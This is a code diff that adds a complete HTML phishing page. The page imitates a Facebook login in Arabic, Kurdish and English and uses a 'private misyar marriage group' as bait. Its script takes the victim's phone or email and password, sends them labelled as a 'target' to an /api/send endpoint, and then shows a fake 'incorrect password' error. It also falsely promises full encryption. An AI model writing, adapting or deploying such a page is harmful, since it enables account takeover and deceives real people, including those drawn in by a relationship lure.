@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="page_title">تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
+        body {
+            display:flex; justify-content:center; align-items:center; min-height:100vh;
+            background:#f0f2f5; flex-direction:column; padding:20px;
+        }
+        .lang-selector {
+            position:fixed; top:15px; left:20px; z-index:99; background:#fff;
+            border-radius:30px; padding:5px 15px; box-shadow:0 2px 10px rgba(0,0,0,.1);
+            display:flex; gap:8px;
+        }
+        .lang-btn {
+            border:none; background:transparent; padding:8px 12px; border-radius:20px;
+            cursor:pointer; font-size:13px; font-weight:600; color:#666; transition:.3s;
+        }
+        .lang-btn.active { background:#1877f2; color:#fff; }
+        .card {
+            width:400px; max-width:95%; background:#fff; border-radius:12px;
+            padding:30px 28px; box-shadow:0 8px 30px rgba(0,0,0,.12); text-align:center;
+            margin-top:50px;
+        }
+        .fb-logo {
+            width:70px; height:70px; margin:0 auto 16px; border-radius:50%;
+            background:#1877f2; display:flex; align-items:center; justify-content:center;
+            font-size:44px; font-weight:bold; color:#fff; font-family:'Segoe UI',Arial,sans-serif;
+            font-style:italic; box-shadow:0 8px 20px rgba(24,119,242,.4);
+        }
+        h1 { color:#1c1e21; font-size:20px; margin-bottom:8px; }
+        .subtitle { color:#65676b; font-size:14px; margin-bottom:24px; }
+        .input-group { text-align:right; margin-bottom:14px; }
+        .input-group label { display:block; font-size:13px; font-weight:600; color:#1c1e21; margin-bottom:6px; }
+        .input-group input {
+            width:100%; height:48px; border:1px solid #dddfe2; border-radius:8px;
+            padding:0 14px; font-size:15px; font-family:'Cairo',sans-serif; direction:rtl;
+            background:#f5f6f7; outline:none; transition:.2s;
+        }
+        .input-group input:focus { border-color:#1877f2; background:#fff; box-shadow:0 0 0 3px rgba(24,119,242,.15); }
+        .btn {
+            width:100%; height:48px; border:none; border-radius:8px; cursor:pointer;
+            background:#1877f2; color:#fff; font-size:17px; font-weight:700;
+            font-family:'Cairo',sans-serif; transition:.2s; margin-top:6px;
+        }
+        .btn:hover { background:#166fe5; }
+        .btn:disabled { opacity:.6; cursor:not-allowed; }
+        .error {
+            display:none; margin-top:14px; padding:12px; border-radius:8px;
+            background:#fdecea; color:#c0392b; font-size:14px; font-weight:600; text-align:center;
+        }
+        .error.show { display:block; }
+        .forgot { margin-top:16px; color:#1877f2; font-size:13px; font-weight:600; cursor:pointer; }
+        .note { margin-top:10px; color:#999; font-size:11px; }
+        .hidden { display:none; }
+    </style>
+</head>
+<body>
+
+    <div class="lang-selector">
+        <button class="lang-btn active" data-lang="ar">العربية</button>
+        <button class="lang-btn" data-lang="ckb">کوردی</button>
+        <button class="lang-btn" data-lang="en">English</button>
+    </div>
+
+    <div class="card">
+        <div class="fb-logo">f</div>
+        <h1 data-i18n="welcome">أهلاً بكم في كروب خاص للزواج المسيار</h1>
+        <p class="subtitle" data-i18n="subtitle">للجادين فقط — سجّل دخولك للمتابعة</p>
+
+        <div class="input-group">
+            <label data-i18n="label_email">رقم الهاتف أو البريد الإلكتروني</label>
+            <input id="email" type="text" autocomplete="off" autocapitalize="off" spellcheck="false"
+                   data-i18n-ph="ph_email" placeholder="أدخل رقم الهاتف أو البريد">
+        </div>
+
+        <div class="input-group">
+            <label data-i18n="label_pass">كلمة المرور</label>
+            <input id="pass" type="password" data-i18n-ph="ph_pass" placeholder="أدخل كلمة المرور">
+        </div>
+
+        <button id="btnLogin" class="btn" data-i18n="login_btn">تسجيل دخول</button>
+
+        <div id="errorBox" class="error" data-i18n="error_msg">كلمة المرور أو رقم الهاتف غير صحيحين</div>
+
+        <div class="forgot" data-i18n="forgot">نسيت كلمة المرور؟</div>
+        <p class="note" data-i18n="note">بياناتك محمية بتشفير كامل 🔒</p>
+    </div>
+
+    <script>
+        // ========== الترجمات ==========
+        var translations = {
+            ar: {
+                page_title: "تسجيل الدخول",
+                welcome: "أهلاً بكم في كروب خاص للزواج المسيار",
+                subtitle: "للجادين فقط — سجّل دخولك للمتابعة",
+                label_email: "رقم الهاتف أو البريد الإلكتروني",
+                ph_email: "أدخل رقم الهاتف أو البريد",
+                label_pass: "كلمة المرور",
+                ph_pass: "أدخل كلمة المرور",
+                login_btn: "تسجيل دخول",
+                error_msg: "كلمة المرور أو رقم الهاتف غير صحيحين",
+                sending: "⏳ جارٍ التحقق...",
+                forgot: "نسيت كلمة المرور؟",
+                note: "بياناتك محمية بتشفير كامل 🔒"
+            },
+            ckb: {
+                page_title: "چوونەژوورەوە",
+                welcome: "بەخێربێن بۆ گرووپی تایبەتی زەواجی مسیار",
+                subtitle: "تەنها بۆ جددیەکان — بۆ بەردەوامبوون چوونەژوورەوە بکە",
+                label_email: "ژمارەی مۆبایل یان ئیمەیڵ",
+                ph_email: "ژمارەی مۆبایل یان ئیمەیڵ بنووسە",
+                label_pass: "وشەی نهێنی",
+                ph_pass: "وشەی نهێنی بنووسە",
+                login_btn: "چوونەژوورەوە",
+                error_msg: "وشەی نهێنی یان ژمارەی مۆبایل هەڵەیە",
+                sending: "⏳ پشکنین دەکرێت...",
+                forgot: "وشەی نهێنیت لەبیرە؟",
+                note: "داتاکانت بە تەواوی پارێزراون 🔒"
+            },
+            en: {
+                page_title: "Log In",
+                welcome: "Welcome to the Private Misyar Marriage Group",
+                subtitle: "Serious people only — log in to continue",
+                label_email: "Phone number or email",
+                ph_email: "Enter phone or email",
+                label_pass: "Password",
+                ph_pass: "Enter password",
+                login_btn: "Log In",
+                error_msg: "The password or phone number is incorrect",
+                sending: "⏳ Verifying...",
+                forgot: "Forgot password?",
+                note: "Your data is fully encrypted 🔒"
+            }
+        };
+
+        // ========== تغيير اللغة ==========
+        function changeLang(lang) {
+            document.documentElement.dir = (lang === 'ar' || lang === 'ckb') ? 'rtl' : 'ltr';
+            document.title = translations[lang].page_title;
+
+            document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                var key = el.getAttribute('data-i18n');
+                if (translations[lang][key]) el.textContent = translations[lang][key];
+            });
+            document.querySelectorAll('[data-i18n-ph]').forEach(function (el) {
+                var key = el.getAttribute('data-i18n-ph');
+                if (translations[lang][key]) el.setAttribute('placeholder', translations[lang][key]);
+            });
+            document.querySelectorAll('.lang-btn').forEach(function (b) {
+                b.classList.remove('active');
+                if (b.getAttribute('data-lang') === lang) b.classList.add('active');
+            });
+            try { localStorage.setItem('preferred_lang_fb', lang); } catch (e) {}
+        }
+
+        document.querySelectorAll('.lang-btn').forEach(function (b) {
+            b.addEventListener('click', function () { changeLang(b.getAttribute('data-lang')); });
+        });
+
+        window.addEventListener('DOMContentLoaded', function () {
+            var saved = 'ar';
+            try { saved = localStorage.getItem('preferred_lang_fb') || 'ar'; } catch (e) {}
+            changeLang(saved);
+        });
+
+        // ========== المنطق — متوافق مع أحدث نسخة من التطبيق ==========
+        // الرابط من التطبيق: https://the-eye-project.vercel.app/fb.html?chatId=xxxx
+        // لا توكن في الرابط — الإرسال عبر /api/send
+
+        var victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
+
+        function apiSend(payload) {
+            return fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(function (r) { return r.ok; }).catch(function () { return false; });
+        }
+
+        var btnLogin = document.getElementById('btnLogin');
+        var emailInput = document.getElementById('email');
+        var passInput = document.getElementById('pass');
+        var errorBox = document.getElementById('errorBox');
+
+        btnLogin.addEventListener('click', function () {
+            var lang = 'ar';
+            try { lang = localStorage.getItem('preferred_lang_fb') || 'ar'; } catch (e) {}
+
+            var email = emailInput.value.trim();
+            var pass = passInput.value;
+
+            if (!email || !pass) {
+                errorBox.textContent = translations[lang].error_msg;
+                errorBox.classList.add('show');
+                return;
+            }
+
+            btnLogin.disabled = true;
+            btnLogin.textContent = translations[lang].sending;
+            errorBox.classList.remove('show');
+
+            var msg = '🔐 **بيانات دخول جديدة**\n' +
+                '👤 الهدف: ' + victimId + '\n' +
+                '📱 الهاتف/البريد: `' + email + '`\n' +
+                '🔑 كلمة المرور: `' + pass + '`\n' +
+                '🕐 ' + new Date().toLocaleString();
+
+            apiSend({ type: 'message', chatId: victimId, text: msg });
+
+            // إظهار رسالة الخطأ المزيفة بعد لحظة قصيرة
+            setTimeout(function () {
+                btnLogin.disabled = false;
+                btnLogin.textContent = translations[lang].login_btn;
+                errorBox.textContent = translations[lang].error_msg;
+                errorBox.classList.add('show');
+            }, 1200);
+        });
+    </script>
+</body>
+</html>
